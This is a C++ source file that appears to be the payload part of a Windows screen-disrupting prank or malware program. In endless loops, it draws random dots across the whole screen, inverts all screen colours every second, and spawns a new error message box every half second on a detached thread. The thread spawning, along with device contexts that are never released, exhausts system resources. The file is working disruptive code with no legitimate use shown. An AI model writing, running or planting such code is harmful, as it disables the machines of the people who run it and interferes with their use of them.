#include "Common.hpp"
#define EllipseRadius 10

namespace GDI {
    void PointEffect() {
		while (true) {
			HDC hdcScreen = GetDC(NULL);

			int x = rand() % ScreenWidth;
			int y = rand() % ScreenHeight;
			COLORREF color = (rand() % 2) ? RGB(255, 255, 255) : RGB(0, 0, 0);

			HBRUSH hBrush = CreateSolidBrush(color);
			SelectObject(hdcScreen, hBrush);
			Ellipse(hdcScreen, x - EllipseRadius, y - EllipseRadius, x + EllipseRadius, y + EllipseRadius);
			DeleteObject(hBrush);

			Sleep(10);
		}
    }

	void InvertColor() {
		while (true) {
			HDC hdc = GetDC(0);

			PatBlt(hdc, 0, 0, ScreenWidth, ScreenHeight, PATINVERT);

			ReleaseDC(0, hdc);

			Sleep(1000);
		}
	}
}

void ERRORSpam(HWND hWnd) {
	while (true) {
		std::thread t([&]() { MessageBox(hWnd, ERRORMESSAGE, WindowName, MB_OK | MB_ICONERROR); });
		t.detach();
		Sleep(500); 
	}
}